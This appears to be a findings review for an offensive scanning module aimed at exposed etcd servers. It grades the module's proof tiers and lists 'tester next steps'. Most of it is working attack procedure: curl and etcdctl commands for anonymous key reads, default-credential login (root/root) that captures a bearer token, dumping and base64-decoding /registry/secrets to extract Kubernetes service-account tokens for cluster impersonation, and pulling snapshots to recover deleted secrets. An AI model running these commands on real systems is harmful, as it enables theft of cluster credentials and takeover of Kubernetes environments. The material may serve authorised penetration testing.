summary: Well-covered: version fingerprint, v2 keys anon read, v3 kv/range anon read, v3 maintenance/snapshot download (separately gated), and seeded default-cred authenticate against /v3/auth/authenticate (root/root, root/etcd, ...). Snapshot probe is a T2-shaped proof (proves the streaming primitive). Default-cred flow is genuine T3 (bearer token captured). Missing: doesn't actually pull /registry/secrets after obtaining the token (that's the k8s crown-jewel dump).

findings.tier_evidence: v3 kv/range or v2 /v2/keys?recursive returning 200 with kvs/nodes is deterministic proof; secrets not dumped in-module.
findings.promotion_notes: Pull /registry/secrets/ --prefix (k8s Secrets), base64-decode, extract SA tokens for cluster impersonation. Also /registry/pods to map workloads.
findings.tester_next_step: ETCDCTL_API=3 etcdctl --endpoints http://<ip>:2379 get /registry/secrets/ --prefix -w json | jq -r '.kvs[]|.value|@base64d' > k8s_secrets.dump — decode SA tokens and TLS.

findings.tier_evidence: Actual bearer token returned from /v3/auth/authenticate on a seeded credential — reusable auth material captured.
findings.promotion_notes: Chain: use captured token with 'authorization: <token>' header against every etcd RPC (kv/range, maintenance/snapshot, cluster/member/list). Automate the /registry/secrets pull once token in hand.
findings.tester_next_step: TOKEN=$(curl -sX POST http://<ip>:2379/v3/auth/authenticate -d '{"name":"root","password":"root"}' | jq -r .token); curl -H "authorization: $TOKEN" -X POST http://<ip>:2379/v3/kv/range -d '{"key":"AA==","range_end":"AA=="}'

findings.tier_evidence: POST /v3/maintenance/snapshot returning a streamed base64-decoded blob is proof-of-exploit: the module captured actual bbolt bytes (not just a status code).
findings.promotion_notes: Complete the download (currently capped at ~200KB) to a real .db file, run etcdctl snapshot restore, walk bbolt to recover DELETED historical Secrets that current kv/range would miss.
findings.tester_next_step: curl -sk -X POST http://<ip>:2379/v3/maintenance/snapshot -o etcd-snap.db && etcdctl snapshot status etcd-snap.db && etcdctl snapshot restore etcd-snap.db --data-dir /tmp/etcd-restore — then grep bbolt for historic secrets.

findings.tier_evidence: Version fingerprint only, no exploit primitive.
findings.promotion_notes: The default-cred flow already covers most auth-required cases; could add attempted /v3/auth/user/list with common user names.
findings.tester_next_step: curl http://<ip>:2379/version — record version for CVE lookup; try client certs from any looted ~/.etcd/ dir.

proposed_shared_surface_consumers: known_creds (SA tokens from /registry/secrets, root/etcd cred pair)
known_hostkeys (TLS from k8s Secrets in etcd)
